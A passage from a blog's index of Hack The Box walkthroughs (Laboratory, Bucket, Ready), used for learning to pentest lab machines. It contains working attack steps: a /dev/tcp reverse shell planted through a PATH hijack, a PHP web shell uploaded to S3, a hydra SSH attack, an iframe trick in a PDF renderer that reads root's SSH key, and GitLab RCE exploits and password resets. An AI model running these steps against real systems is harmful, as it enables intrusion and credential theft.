/var/run/sshd,sshd /var/opt/gitlab,git /var/opt/gitlab/postgresql,gitlab-psql /var/opt/gitlab/mattermost,mattermost /var/opt/gitlab/registry,registry /var/opt/gitlab/prometheus,gitlab-prometheus /var/opt/gitlab/consul,gitlab-consul   Initial Foothold   Already knowing about a few accounts and the possibility to read files in arbitrarily, I was searching how to convert this LFI to an RCE, to be able to get a reverse shell in this box. After some research I have found a Metasploit Module that makes use of this same vulnerability to obtain the secret_key_base from GitLab, and, with a deserialization call in the obtained cookie, obtain a reverse shell as the running account, in this case git.   msf6 exploit(multi/http/gitlab_file_read_rce) &gt; run  [*] Started reverse TCP handler on 10.10.10.10:4444  [*] Executing automatic check (disable AutoCheck to override) [+] The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version. [*] Logged in to user jdoe [*] Created project /jdoe/vWL4JJIQ [*] Created project /jdoe/NVfFvw3v [*] Created issue /jdoe/vWL4JJIQ/issues/1 [*] Executing arbitrary file load [+] File saved as: '/home/zurc/.msf4/loot/20210219090516_default_10.10.10.216_gitlab.secrets_242811.txt' [+] Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3 [*] NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file read [*] Attempting to delete project /jdoe/vWL4JJIQ [*] Deleted project /jdoe/vWL4JJIQ [*] Attempting to delete project /jdoe/NVfFvw3v [*] Deleted project /jdoe/NVfFvw3v [*] Command shell session 1 opened (10.10.10.10:4444 -&gt; 10.10.10.216:35138) at 2021-02-19 09:05:22 -0300  id uid=998(git) gid=998(git) groups=998(git)   User flag   With access to the machine, started enumerating using linpeas.sh from PEAS Suite. This helped me a lot once I could learn the possibilities while exploiting a GitLab server. The script detects that the service is installed and returned some interesting information about the machine itself:      GitLab accounts, where dexter (admin@example.com) is an administrator.   We are running from a docker container, where we might be required to escape it to exploit the machine itself.   One of the possibilities listed by linpeas.sh is that we could change the password from any user, which was successfully done for dexter after running the commands below:   git@git:~/gitlab-rails$ gitlab-rails console --------------------------------------------------------------------------------  GitLab:       12.8.1 (d18b43a5f5a) FOSS  GitLab Shell: 11.0.0  PostgreSQL:   10.12 -------------------------------------------------------------------------------- Loading production environment (Rails 6.0.2) irb(main):001:0&gt; user = User.find_by(email: \"admin@example.com\") =&gt; #&lt;User id:1 @dexter&gt; irb(main):002:0&gt; user.password = \"P@ssw0rd\" =&gt; \"P@ssw0rd\" irb(main):003:0&gt; user.password_confirmation = \"P@ssw0rd\" =&gt; \"P@ssw0rd\" irb(main):004:0&gt; user.save! Enqueued ActionMailer::DeliveryJob (Job ID: 0f18c1b4-9929-47a5-90d7-ec16a7e6f293) to Sidekiq(mailers) with arguments: \"DeviseMailer\", \"password_change\", \"deliver_now\", #&lt;GlobalID:0x00007fa424ee0668 @uri=#&lt;URI::GID gid://gitlab/User/1&gt;&gt; =&gt; true irb(main):005:0&gt;    After changed its password, I was able to login with his account and see other repositories in his shoes, where we found a SecureDocker private repo, which called a lot of attention.      Once we have access to the source code, downloaded its contents and found some interesting information used to build the container and a SSH key from dexter under his personal stuff, as mentioned in repo’s description.      CONFIDENTIAL - Secure docker configuration for homeserver. Also some personal stuff, I’ll figure that out later.    After cloning it, we were able to see the following information:   $ git -c http.sslVerify=false clone http://git.laboratory.htb/dexter/securedocker.git   Cloning into 'securedocker'... Username for 'https://git.laboratory.htb': dexter Password for 'https://dexter@git.laboratory.htb':  warning: redirecting to https://git.laboratory.htb/dexter/securedocker.git/ remote: Enumerating objects: 10, done. remote: Counting objects: 100% (10/10), done. remote: Compressing objects: 100% (9/9), done. remote: Total 10 (delta 0), reused 0 (delta 0), pack-reused 0 Receiving objects: 100% (10/10), done.   $ tree -a -I '.git' . ├── create_gitlab.sh ├── dexter │   ├── recipe.url │   ├── .ssh │   │   ├── authorized_keys │   │   └── id_rsa │   └── todo.txt └── README.md  2 directories, 6 files   Just like we did on Luanne, we have converted it to an RSA key using the commands below:   $ chmod 600 id_rsa $ ssh-keygen -p -m PEM -f ./id_rsa Key has comment 'root@laboratory' Enter new passphrase (empty for no passphrase):  Enter same passphrase again:  Your identification has been saved with the new passphrase.   After the mentioned process, I was able to SSH to the machine and get the user flag under Dexter’s account:   $ ssh -i id_rsa dexter@10.10.10.216 dexter@laboratory:~$ ls -la total 40 drwxr-xr-x 6 dexter dexter 4096 Oct 22 08:42 . drwxr-xr-x 3 root   root   4096 Jun 26  2020 .. lrwxrwxrwx 1 root   root      9 Jul 17  2020 .bash_history -&gt; /dev/null -rw-r--r-- 1 dexter dexter  220 Feb 25  2020 .bash_logout -rw-r--r-- 1 dexter dexter 3771 Feb 25  2020 .bashrc drwx------ 2 dexter dexter 4096 Jun 26  2020 .cache drwx------ 2 dexter dexter 4096 Oct 22 08:14 .gnupg drwxrwxr-x 3 dexter dexter 4096 Jun 26  2020 .local -rw-r--r-- 1 dexter dexter  807 Feb 25  2020 .profile drwx------ 2 dexter dexter 4096 Jun 26  2020 .ssh -r--r----- 1 root   dexter   33 Feb 19 11:06 user.txt dexter@laboratory:~$ cat user.txt  &lt;redacted&gt;   Root flag   After running linpeas.sh again, this time in the real machine, noticed that there’s an SUID file with permissions attributed to the user dexter.   dexter@laboratory:~$ ls -la /usr/local/bin/docker-security -rwsr-xr-x 1 root dexter 16720 Aug 28 14:52 /usr/local/bin/docker-security   Executing this binary, I couldn’t see any output, as well as no information/help is shown when used parameters like --version and --help. Analyzing the binary further, noticed that it’s an ELF, which could be abused somehow using a path hijack or buffer overflow.   dexter@laboratory:~$ file /usr/local/bin/docker-security /usr/local/bin/docker-security: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d466f1fb0f54c0274e5d05974e81f19dc1e76602, for GNU/Linux 3.2.0, not stripped   Before using disassembly tools, inspected the files strings from the attacker machine (once strings wasn’t available in this box) and some entries called attention: two calls to chmod to redefine docker directories permissions, but without specifying the full path to the binary, confirming the suspicion that it is vulnerable to path hijacking.   $ strings docker-security [...]  []A\\A]A^A_ chmod 700 /usr/bin/docker chmod 660 /var/run/docker.sock ;*3$\" GCC: (Debian 10.1.0-6) 10.1.0  [...]   Path hijack   To get root privileges, the first step is to create a fake chmod, in this case to return a reverse shel to the attacker machine. After that we need to modify user’s PATH variable so we can call our own chmod file instead of the one previously installed. The steps below achieve the tasks mentioned:   dexter@laboratory:~$ echo '#!/bin/bash' &gt; /dev/shm/chmod dexter@laboratory:~$ echo 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/4443 0&gt;&amp;1' &gt;&gt; /dev/shm/chmod dexter@laboratory:~$ chmod +x /dev/shm/chmod dexter@laboratory:~$ PATH=/dev/shm:$PATH dexter@laboratory:~$ echo $PATH /dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin   After starting the listener in the port defined in the fake chmod binary (nc -lnvp 4443), executed docker-security which gave us the very expected root access, allowing us to read the root flag.   $ nc -lnvp 4443                                                                                              listening on [any] 4443 ... connect to [10.10.10.10] from (UNKNOWN) [10.10.10.216] 44754 root@laboratory:~# id   id uid=0(root) gid=0(root) groups=0(root),1000(dexter) root@laboratory:~# cat /root/root.txt cat /root/root.txt &lt;redacted&gt;   I hope you guys have enjoyed this box resolution.   See you in the next post soon! :smiley:  ","categories": ["Walkthrough"],
        "tags": ["HackTheBox","HTB Easy","HTB Linux"],
        "url": "/walkthrough/2021/04/htb-laboratory",
        "teaser": "https://i.imgur.com/kUCyV6R.png"
      },{
        "title": "Walktrough: HTB Bucket",
        "excerpt":"Hello guys!   This week’s machine will be Bucket, another median-rated machine from Hack The Box, created by MrR3boot.   :information_source: Info: Write-ups for Hack The Box machines are posted as soon as they’re retired.      Solving this box was pretty cool, where I had the opportunity to “play” a little with AWS storage services, even being in a local instance normally used by developers.   Its resolution was closely linked to this service, where we had to identify a way to include a file on the published website to get a reverse shell and later the user flag with the credentials harvested during enumeration.   Root flag was obtained after abuse of an application still under development, where we used a vulnerable code to get an id_rsa key and thus gain interactive shell as root.   Enumeration   As usual, we start with a quick nmap scan, to identify the services currently published on this machine:   $ nmap -sC -sV -Pn -oA quick 10.10.10.212 Nmap 7.91 scan initiated Fri Feb 26 08:16:37 2021 as: nmap -sC -sV -Pn -oA quick 10.10.10.212 Nmap scan report for 10.10.10.212 Host is up (0.077s latency). Not shown: 998 closed ports PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) |   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open  http    Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://bucket.htb/ Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Feb 26 08:16:48 2021 -- 1 IP address (1 host up) scanned in 10.55 seconds   80/TCP - Serviço HTTP   Once I have noticed a redirect to bucket.htb, I have modified the local hosts file to map this hostname to the box IP address.   After accessing the website, as none of the images were loaded figured out after a curl call that they were pointing to s3.bucket.htb, which was later added to the local host file as well.   $ curl -L http://bucket.htb | grep -Eo 'href=\".*\"|src=\".*\"' | sort -u   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                  Dload  Upload   Total   Spent    Left  Speed 100  5344  100  5344    0     0  33822      0 --:--:-- --:--:-- --:--:-- 33822 href=\"#\" href=\"#\"&gt;&lt;i class=\"fab fa-facebook-square\" href=\"#\"&gt;&lt;i class=\"fab fa-instagram\" href=\"#\"&gt;&lt;i class=\"fab fa-linkedin\" href=\"#\"&gt;&lt;i class=\"fab fa-twitter\" src=\"http://s3.bucket.htb/adserver/images/bug.jpg\" alt=\"Bug\" height=\"160\" width=\"160\" src=\"http://s3.bucket.htb/adserver/images/cloud.png\" alt=\"cheer\" height=\"160\" width=\"160\" src=\"http://s3.bucket.htb/adserver/images/malware.png\" alt=\"Malware\" height=\"160\" width=\"160\"   s3.bucket.htb   After identifying the DNS s3.bucket.htb instantly made the link of S3 with Amazon S3, a cloud service that provides blob storage.   Checking the webserver of the request, noticed that for one of the image URLs the webserver that answered the request was different from Apache seen in nmap scan (hypercorn-h11), which means that there’s some kind of proxy or a different web server answering the request for this virtual host.   To understand what we have in this structure, I have started a gobuster enumeration and have found two interesting directories: health and shell   $ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://s3.bucket.htb -o gobuster-s3.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url:            http://s3.bucket.htb [+] Threads:        10 [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes:   200,204,301,302,307,401,403 [+] User Agent:     gobuster/3.0.1 [+] Timeout:        10s =============================================================== 2021/02/26 09:42:22 Starting gobuster =============================================================== /health (Status: 200) /shell (Status: 200) Progress: 2643 / 220561 (1.20%)   Is important to notice that these are directories and not pages, once the result of the web request as seen in curl below is different if the slash (/) is present in the end or not:   $ curl -L http://s3.bucket.htb/health                                                                        {\"services\": {\"s3\": \"running\", \"dynamodb\": \"running\"}}  $ curl -L http://s3.bucket.htb/health/ {\"status\": \"running\"}                                                                                                  $ curl -L http://s3.bucket.htb/shell   $ curl -L http://s3.bucket.htb/shell/ &lt;!DOCTYPE html&gt; &lt;html itemscope itemtype=\"http://schema.org/Product\"&gt;   &lt;head&gt;     &lt;title&gt;AWS Console&lt;/title&gt;     &lt;meta charset=\"UTF-8\"&gt;      &lt;!-- Application --&gt; [...]   As the last request (curl -L http://s3.bucket.htb/shell/) returned an HTML page, I’ve retried it using a browser and noticed that I was accessing DynamoDB Web Shell.   Researching a little about this service I could determine it is a storage emulator for AWS, possibly a Localstack, very popular among developers.      Playing with some samples on the page, I was able to get some information about the existing tables (ListTables e DescribeTable), as below, where I could identify some information like the region (us-east-1) and a table called users, as well as its respective resource name arn:aws:dynamodb:us-east-1:000000000000:table/users.      Considering we’re talking about a LocalStack instance, I have found that would be possible to use AWS CLI, AWS command-line interface utility, to connect to this service, as described in the following post Local Development with AWS on LocalStack (reflectoring.io).   As awscli is more flexible to enumerate and work with resources than DynamoDB Web Shell, I have installed it using apt and connected to it using the information obtained in the post mentioned above. For credentials, any value can be used, once it isn’t a true AWS service.   # Install aws cli $ sudo apt install awscli -y [...] $ aws configure --profile bucket.htb                                                                          AWS Access Key ID [None]: dummy AWS Secret Access Key [None]: dummy Default region name [None]: us-east-1 Default output format [None]:   Reading about awscli for DynamoDB, ran some simple queries to list tables and their existing entries, as below, where I was able to get some username and passwords that could be useful later.   $ aws dynamodb list-tables \\     --endpoint-url http://s3.bucket.htb \\     --profile bucket.htb \\     --output json {   \"TableNames\": [     \"users\"   ] }  $ aws dynamodb scan \\     --table-name users \\     --endpoint-url http://s3.bucket.htb \\     --profile bucket.htb \\     --output json {   \"Items\": [     {       \"password\": {         \"S\": \"Management@#1@#\"       },       \"username\": {         \"S\": \"Mgmt\"       }     },     {       \"password\": {         \"S\": \"Welcome123!\"       },       \"username\": {         \"S\": \"Cloudadm\"       }     },     {       \"password\": {         \"S\": \"n2vM-&lt;_K_Q:.Aa2\"       },       \"username\": {         \"S\": \"Sysadm\"       }     }   ],   \"Count\": 3,   \"ScannedCount\": 3,   \"ConsumedCapacity\": null }   As we know that we also have an s3 running, enumerated some information about existing containers and blobs, where adserver was found (where we already knew due to the URL of the images listed), and confirmed what else is hosted in this bucket.   $ aws s3 ls \\     --endpoint-url http://s3.bucket.htb \\     --profile bucket.htb 2021-02-26 11:48:02 adserver  $ aws s3 ls s3://adserver \\     --endpoint-url http://s3.bucket.htb \\     --profile bucket.htb                            PRE images/ 2021-02-26 11:50:04       5344 index.html  $ aws s3 ls s3://adserver/images/ \\     --endpoint-url http://s3.bucket.htb \\     --profile bucket.htb 2021-02-26 11:52:02      37840 bug.jpg 2021-02-26 11:52:02      51485 cloud.png 2021-02-26 11:52:02      16486 malware.png   Initial Access   Once we have access to the s3 bucket and know which contents are available and how to use them, the first thing to do is to upload a reverse shell payload to the website and then proceed with enumeration. To keep things simple, I’ll use the following PHP web shell:   &lt;?php system($_GET['cmd']); ?&gt;   After creating the file, upload it to the bucket using awscli:   $ aws s3 cp ./exploit.php s3://adserver/ \\     --endpoint-url http://s3.bucket.htb \\     --profile bucket.htb upload: ./exploit.php to s3://adserver/exploit.php                  $ aws s3 --endpoint-url http://s3.bucket.htb --profile bucket.htb ls s3://adserver/                                          PRE images/ 2021-02-26 11:56:28         31 exploit.php 2021-02-26 11:56:02       5344 index.html   After trying to access it a few seconds later, noticed that the file was removed by another process. To circumvent this, made the execution call right after the upload command, running the command id, where I was able to confirm that this approach worked.   $ aws s3 cp ./exploit.php s3://adserver/ \\     --endpoint-url http://s3.bucket.htb --profile bucket.htb &amp;&amp; curl -L http://bucket.htb/exploit.php?cmd=id upload: ./exploit.php to s3://adserver/exploit.php                 uid=33(www-data) gid=33(www-data) groups=33(www-data)   To get a reverse shell, replaced the exploit.php by pentestmonkey/php-reverse-shell (github.com) that after modifying it starts automatically to the listener previously defined, without the need of parameters in the payload, which resulted in success after a few attempts.   aws s3 --endpoint-url http://s3.bucket.htb --profile bucket.htb cp ./exploit.php s3://adserver/ &amp;&amp; curl -L http://bucket.htb/exploit.php   User flag   Now with a reverse shell to the machine, ran linpeas.sh to make it easier the enumeration, where the following points were identified:           Local user roy has console access and, enumerating his home directory found the file user.txt and folder project, access to both denied using www-data credentials.              This user has no running processes that could allow us to hijack them so we would need to obtain his credentials to proceed with this machine.                Other services are running in this box, listening in ports 4566, 8000, and 38443, which could be used to escalate privileges later.       [+] Active Ports                                                                                          [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                Active Internet connections (servers and established)                                                      Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name          tcp        0      0 127.0.0.1:38443         0.0.0.0:*               LISTEN      -                         tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                          tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      -                          tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                          tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                                This box has also containers in execution (ctr, runc), probably from localstack, being also a possibility when checking for privesc paths.            There’s a directory /var/www/bucket-app that could be used by one of the apps previously identified, but also doesn’t allow us to read it with www-data credentials.       From the points discussed, what called more attention to me was the other services, so started by checking apache configurations (/etc/apache2/sites-enabled) where we had the file 000-default.conf listed below, but nothing about 38443, but was able to get insights about 4566 and 8000, which published the content from /var/www/bucket-app folder.   &lt;VirtualHost 127.0.0.1:8000&gt;     &lt;IfModule mpm_itk_module&gt;         AssignUserId root root     &lt;/IfModule&gt;     DocumentRoot /var/www/bucket-app &lt;/VirtualHost&gt;  &lt;VirtualHost *:80&gt;     DocumentRoot /var/www/html     RewriteEngine On     RewriteCond %{HTTP_HOST} !^bucket.htb$     RewriteRule /.* http://bucket.htb/ [R] &lt;/VirtualHost&gt; &lt;VirtualHost *:80&gt;     ProxyPreserveHost on     ProxyPass / http://localhost:4566/     ProxyPassReverse / http://localhost:4566/     &lt;Proxy *&gt;         Order deny,allow         Allow from all     &lt;/Proxy&gt;     ServerAdmin webmaster@localhost     ServerName s3.bucket.htb      ErrorLog ${APACHE_LOG_DIR}/error.log     CustomLog ${APACHE_LOG_DIR}/access.log combined  &lt;/VirtualHost&gt;   Besides being able to connect to this service locally, we’ll need some credentials to tunnel some communication via SSH and properly enumerate this service.   Once this website had nothing interesting, decided to test the passwords previously collected in DynamoDB for user roy, and luckily we had success. Below is the hydra execution which automated this SSH Brute Force.   $ hydra -l roy -P passwords 10.10.10.212 -t 4 ssh Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-26 12:55:36 [DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task [DATA] attacking ssh://10.10.10.212:22/ [22][ssh] host: 10.10.10.212   login: roy   password: n2vM-&lt;_K_Q:.Aa2 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-26 12:55:40   Once we have access to the machine as roy, I have collected the user flag:   roy@bucket:~$ id uid=1000(roy) gid=1000(roy) groups=1000(roy),1001(sysadm) roy@bucket:~$ cat user.txt  &lt;redacted&gt;   Root flag   Now as roy, was able to check the contents of both project and /var/www/bucket-app folders, which were very similar to each other. To inspect the contents better, made a copy of /var/www/bucket-app for analysis.   Checking the contents of index.php we have something very interesting: a hidden function that generates a PDF file with the rendered content of a Ransomware alert in DynamoDB if a POST request is made with the body contents of action=get_alerts, storing it in /var/www/bucket-app/files/ folder.   &lt;?php require 'vendor/autoload.php'; use Aws\\DynamoDb\\DynamoDbClient; if($_SERVER[\"REQUEST_METHOD\"]===\"POST\") {     if($_POST[\"action\"]===\"get_alerts\") {         date_default_timezone_set('America/New_York');         $client = new DynamoDbClient([             'profile' =&gt; 'default',             'region'  =&gt; 'us-east-1',             'version' =&gt; 'latest',             'endpoint' =&gt; 'http://localhost:4566'         ]);          $iterator = $client-&gt;getIterator('Scan', array(             'TableName' =&gt; 'alerts',             'FilterExpression' =&gt; \"title = :title\",             'ExpressionAttributeValues' =&gt; array(\":title\"=&gt;array(\"S\"=&gt;\"Ransomware\")),         ));          foreach ($iterator as $item) {             $name=rand(1,10000).'.html';             file_put_contents('files/'.$name,$item[\"data\"]);         }         passthru(\"java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf\");     } } else { ?&gt;   Once we don’t have a table called alerts, as already enumerated, we’ll need to create it with the attributes title and data, which will contain the HTML content to be rendered and later stored in a PDF, possibly allowing us to get some sensitive data from this machine.   For the initial test, as described in AWS documentation in this link, I’ve created a script to create the table, include the Ransomware entry, and then make the POST call to generate the PDF.   To make it easier this process, which is being executed from the attacker machine, executed the following processes:      From the attacker machine, created an RSA key (ssh-keygen) and associated it with roy’s account to prevent asking for a password during the process.   In the attacker machine was also made a port forwarding using SSH, allowing us to call port 8000 locally and this request would be routed to 8000 to bucket, as below   ssh roy@10.10.10.212 -L 8000:127.0.0.1:8000       After some attempts, noticed that similarly in the beginning while uploading the exploit, the tables and entries created were deleted, preventing us from easily getting the content desired. The solution was to chain the commands as made previously processing the request as soon as the resources were available, as well as the file copy later if we had success in the initial call.   aws dynamodb create-table \\     --table-name alerts \\     --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S \\     --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE \\     --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=10 \\     --endpoint-url http://s3.bucket.htb \\     --profile bucket.htb &amp;&amp; \\ aws dynamodb put-item \\     --table-name alerts \\     --item '{\"title\": {\"S\": \"Ransomware\"},\"data\": {\"S\": \"&lt;html&gt;&lt;head&gt;&lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Head 1&lt;/h1&gt;&lt;p&gt;Content&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;\"}}' \\     --return-consumed-capacity TOTAL \\     --endpoint-url http://s3.bucket.htb \\     --profile bucket.htb &amp;&amp; \\ curl --data \"action=get_alerts\" http://localhost:8000/   After a few attempts, successfully retrieved the result.pdf file with the content we have passed in the DynamoDB.   roy@bucket:/var/www/bucket-app/files$ ls -la total 16 drwxr-x---+ 2 root root 4096 Feb 26 18:51 . drwxr-x---+ 4 root root 4096 Feb 10 12:29 .. -rw-r--r--  1 root root   88 Feb 26 18:51 7627.html -rw-r--r--  1 root root 1870 Feb 26 18:51 result.pdf      Once we have been able to make the request work, the second step is finding a way to get sensitive data into the PDF file.   The easiest way would be to import /root/root.txt, but this doesn’t give us an interactive shell in the box. Just like we did in Passage, we can look for the file /root/.ssh/id_rsa and use it to SSH into the machine as root but our issue right now is to find a way to import this file in the static HTML file that will later be rendered into the PDF.   After some research, the easiest way without using a Javascript to make this possible would be using an iframe, which I’ve added the tag &lt;iframe src=\"/root/.ssh/id_rsa\" seamless&gt;&lt;/iframe&gt; in the HTML content sent earlier:   aws dynamodb create-table \\     --table-name alerts \\     --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S \\     --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE \\     --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=10 \\     --endpoint-url http://s3.bucket.htb \\     --profile bucket.htb &amp;&amp; \\ aws dynamodb put-item \\     --table-name alerts \\     --item '{\"title\": {\"S\": \"Ransomware\"},\"data\": {\"S\": \"&lt;html&gt;&lt;head&gt;&lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Head 1&lt;/h1&gt;&lt;iframe src=\\\"/root/.ssh/id_rsa\\\" seamless&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt;\"}}' \\     --return-consumed-capacity TOTAL \\     --endpoint-url http://s3.bucket.htb \\     --profile bucket.htb &amp;&amp; \\ curl --data \"action=get_alerts\" http://localhost:8000/       After running it, was able to download the file at /var/www/bucket-app/files/result.pdf and, with the contents inside it, created the file id_rsa, which was used to authenticate to SSH to the box as root, being able to read the root.txt file.   root@bucket:~# id uid=0(root) gid=0(root) groups=0(root) root@bucket:~# cat /root/root.txt &lt;redacted&gt;   I hope you guys have enjoyed this post.   See you again soon! :smiley:  ","categories": ["Walkthrough"],
        "tags": ["HackTheBox","HTB Medium","HTB Linux"],
        "url": "/walkthrough/2021/04/htb-bucket",
        "teaser": "https://i.imgur.com/CjKnqww.png"
      },{
        "title": "Walktrough: HTB Ready",
        "excerpt":"Hello guys!   This week’s machine will be Ready, another median-rated machine from Hack The Box, created by bertolis.   :information_source: Info: Write-ups for Hack The Box machines are posted as soon as they’re retired.      This machine had a very interesting resolution, where we’ll exploit a vulnerable version of GitLab Server and then escape the docker container to obtain the root flag.   Enumeration   As usual, we start with a nmap quick scan, to identify the services currently published on this machine:   $ nmap -sC -sV -Pn -oA quick 10.10.10.220 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-27 12:05 -03 Nmap scan report for 10.10.10.220 Host is up (0.078s latency). Not shown: 998 closed ports PORT     STATE SERVICE VERSION 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) |   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 5080/tcp open  http    nginx | http-robots.txt: 53 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile  | /dashboard /projects/new /groups/new /groups/*/edit /users /help  |_/s/ /snippets/new /snippets/*/edit | http-title: Sign in \\xC2\\xB7 GitLab |_Requested resource was http://10.10.10.220:5080/users/sign_in |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.65 seconds   5080/TCP - HTTP Service   As we can see in nmap output, a GitLab Server Community is running. Similar to Laboratory, proceeded with an account creation to have access to public repositories in this server that could help us proceed in this box.   After account creation, no repository was found but noticed that the running GitLab Server version was 11.4.7, as we can see in the image below.      Initial Foothold   After a quick search on searchsploit for the listed version, identified some available exploits that could be used.   $ searchsploit gitlab 11.4.7 ------------------------------------------------------------------------- ---------------------------------  Exploit Title                                                           |  Path ------------------------------------------------------------------------- --------------------------------- GitLab 11.4.7 - RCE (Authenticated)                                      | ruby/webapps/49334.py Gitlab 11.4.7 - Remote Code Execution                                    | ruby/webapps/49257.py GitLab 11.4.7 - Remote Code Execution (Authenticated)                    | ruby/webapps/49263.py ------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results   Using the last result (49334.py), noticed that it didn’t allowed us to set the service port, which required some edit, as well as an issue in the payload generation, where was necessary to update the parameter local_port to local_port = args.P.   $ python3 49334.py -h                                                                 usage: 49334.py [-h] -u U -p P -g G -l L -P P  GitLab 11.4.7 RCE  optional arguments:   -h, --help  show this help message and exit   -u U        GitLab Username/Email   -p P        Gitlab Password   -g G        Gitlab URL (without port)   -l L        reverse shell ip   -P P        reverse shell port   Also, was necessary to change the payload used, once it wasn’t exporting the shell in nc session, preventing us from interacting with the machine.   After these changes, obtained a reverse shell as user git in the directory ~/gitlab-rails/working   User flag   After initial shell, started enumeration using linenum.sh, where the following details called attention:           App execution inside a docker container, being necessary to escape to the host later.            There’s a local user dude (id=1000), where the user flag user.txt resides in his home directory.            Obtained the GitLab Server credentials dump, where the user root is the only one with privileges, which has the password hash below:                                  username           e-mail           admin           hash                                           root           admin@example.com           true           $2a$10$zzun9kmrHMdwsJZKTmwn9OZddFjwrhbaXx3b2eb9l2g.1LrjZo0V2                           Based on the information above, first thing tried was to check the required privileges to read user.txt, where we identified that git user had access, so we’ve collected it.   git@gitlab:/home/dude$ ls -la total 24 drwxr-xr-x 2 dude dude 4096 Dec  7 16:58 . drwxr-xr-x 1 root root 4096 Dec  2 10:45 .. lrwxrwxrwx 1 root root    9 Dec  7 16:58 .bash_history -&gt; /dev/null -rw-r--r-- 1 dude dude  220 Aug 31  2015 .bash_logout -rw-r--r-- 1 dude dude 3771 Aug 31  2015 .bashrc -rw-r--r-- 1 dude dude  655 May 16  2017 .profile -r--r----- 1 dude git    33 Dec  2 10:46 user.txt git@gitlab:/home/dude$ cat user.txt &lt;redacted&gt;   Root flag   Next step would be obtaining the root credential to read the root.txt flag. As we had his password hash would be easy to crack it or search in internet but, as this task consumes lot of time and resources, decided to skip this for now as this hash wasn’t still publicly known.   During the enumeration, the information was also shared along with the credential dump:      If you have enough privileges, you can make an account under your control administrator by running: gitlab-rails runner ‘user = User.find_by(email: “youruser@example.com”); user.admin = TRUE; user.save!’ Alternatively, you could change the password of any user by running: gitlab-rails runner ‘user = User.find_by(email: “admin@example.com”); user.password = “pass_peass_pass”; user.password_confirmation = “pass_peass_pass”; user.save!’    Based on that, proceeded with the root account password reset as recommended, but no private repository or additional information was found, that could help us succeed on obtaining root’s credentials.   That said, decided to perform a manual enumeration and, looking for backups in the file system, found a directory /opt/backup/, that contained several files inside it.   Performing an grep search on it looking for passwords (passwd, password, pwd), found an entry that called attention on /opt/backup/gitlab.rb, as we can see in the output below, after removing commented and blank lines.   git@gitlab:/opt/backup$ cat /opt/backup/gitlab.rb | grep -Ev '^#|^$' gitlab_rails['smtp_password'] = \"wW59U!ZKMbG9+*#h\" git@gitlab:/opt/backup$   With this credential, tested it for the user root and succeeded, but in root’s home path there was no root.txt, indicating that we’ll need to escape the container to obtain the root’s 